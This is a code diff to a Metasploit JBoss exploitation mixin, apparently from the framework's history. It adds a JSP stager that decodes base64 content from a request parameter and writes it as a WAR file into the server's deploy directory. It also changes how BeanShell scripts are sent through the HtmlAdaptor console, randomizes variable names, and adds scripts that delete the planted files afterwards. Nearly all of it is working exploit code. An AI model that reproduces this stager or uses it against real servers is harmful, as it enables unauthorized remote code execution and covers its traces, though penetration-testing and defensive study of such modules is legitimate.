@@ -23,7 +23,7 @@ module Msf::HTTP::JBoss::BSH
           fail_with(Failure::NoAccess, "Authentication requested: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
         end
 
-        print_error("Upload to deploy WAR [#{res.code} #{res.message}]")
+        print_error("Unable to deploy BSH script [#{res.code} #{res.message}]")
         fail_with(Failure::Unknown, "Invalid reply: #{res.code} #{res.message}")
       else
         success = true
@@ -37,14 +37,42 @@ module Msf::HTTP::JBoss::BSH
     end
   end
 
-  def deploy_stager_bsh(encoded_stager_code, stager_base, stager_jsp_name)
+  def deploy_stager_bsh(app_base, stager_base, stager_jsp_name, content_var)
+	# The following jsp script will write the exploded WAR file to the deploy/
+	# directory. This is used to bypass the size limit for GET/HEAD requests
+	# Dynamic variables, only used if we need a stager
+	decoded_var = Rex::Text.rand_text_alpha(8+rand(8))
+	file_path_var = Rex::Text.rand_text_alpha(8+rand(8))
+	jboss_home_var = Rex::Text.rand_text_alpha(8+rand(8))
+	fos_var = Rex::Text.rand_text_alpha(8+rand(8))
+	stager_jsp = <<-EOT
+<%@page import="java.io.*,
+    java.util.*,
+    sun.misc.BASE64Decoder"
+%>
+<%
+  if (request.getParameter("#{content_var}") != null) {
+    String #{jboss_home_var} = System.getProperty("jboss.server.home.dir");
+    String #{file_path_var} = #{jboss_home_var} + "/deploy/" + "#{app_base}.war";
+    try {
+      String #{content_var} = "";
+      #{content_var} = request.getParameter("#{content_var}");
+      FileOutputStream #{fos_var} = new FileOutputStream(#{file_path_var});
+      byte[] #{decoded_var} = new BASE64Decoder().decodeBuffer(#{content_var});
+      #{fos_var}.write(#{decoded_var});
+      #{fos_var}.close();
+    }
+    catch(Exception e){ }
+  }
+%>
+EOT
+		encoded_stager_code = Rex::Text.encode_base64(stager_jsp).gsub(/\n/, '')
 
-    jsp_file_var = rand_text_alpha(8+rand(8))
-    jboss_home_var = rand_text_alpha(8+rand(8))
-    fstream_var = rand_text_alpha(8+rand(8))
-    byteval_var = rand_text_alpha(8+rand(8))
-    stager_var = rand_text_alpha(8+rand(8))
-    decoder_var = rand_text_alpha(8+rand(8))
+    jsp_file_var = Rex::Text.rand_text_alpha(8+rand(8))
+    fstream_var = Rex::Text.rand_text_alpha(8+rand(8))
+    byteval_var = Rex::Text.rand_text_alpha(8+rand(8))
+    stager_var = Rex::Text.rand_text_alpha(8+rand(8))
+    decoder_var = Rex::Text.rand_text_alpha(8+rand(8))
 
     # The following Beanshell script will write a short stager application into the deploy
     # directory. This stager script is then used to install the payload
@@ -101,19 +129,38 @@ EOT
     params << '&argType=java.lang.String'
     params << '&arg0=' + Rex::Text.uri_encode(bsh_script)
     params << '&argType=java.lang.String'
-    params << '&arg1=' + rand_text_alphanumeric(8+rand(8)) + '.bsh'
+    params << '&arg1=' + Rex::Text.rand_text_alphanumeric(8+rand(8)) + '.bsh'
+
     if (datastore['VERB']== "POST")
       res = send_request_cgi({
         'method'	=> datastore['VERB'],
-        'uri'		=> normalize_uri(datastore['PATH'], '/HtmlAdaptor'),
-        'data'	=> params
+        'uri'			=> normalize_uri(datastore['PATH'], '/HtmlAdaptor'),
+        'data'		=> params
       })
     else
       res = send_request_cgi({
         'method'	=> datastore['VERB'],
-        'uri'		=> normalize_uri(datastore['PATH'], '/HtmlAdaptor') + "?#{params}"
+        'uri'			=> normalize_uri(datastore['PATH'], '/HtmlAdaptor') + "?#{params}"
       }, 30)
     end
     res
   end
+	
+	def get_undeploy_stager(app_base, stager_base, stager_jsp_name)
+    delete_stager_script = <<-EOT
+String jboss_home = System.getProperty("jboss.server.home.dir");
+new File(jboss_home + "/deploy/#{stager_base + '.war/' + stager_jsp_name + '.jsp'}").delete();
+new File(jboss_home + "/deploy/#{stager_base + '.war'}").delete();
+new File(jboss_home + "/deploy/#{app_base + '.war'}").delete();
+EOT
+
+    delete_stager_script
+	end
+	def get_undeploy_bsh(app_base)
+    delete_script = <<-EOT
+String jboss_home = System.getProperty("jboss.server.home.dir");
+new File(jboss_home + "/deploy/#{app_base + '.war'}").delete();
+EOT
+		delete_script
+	end
 end
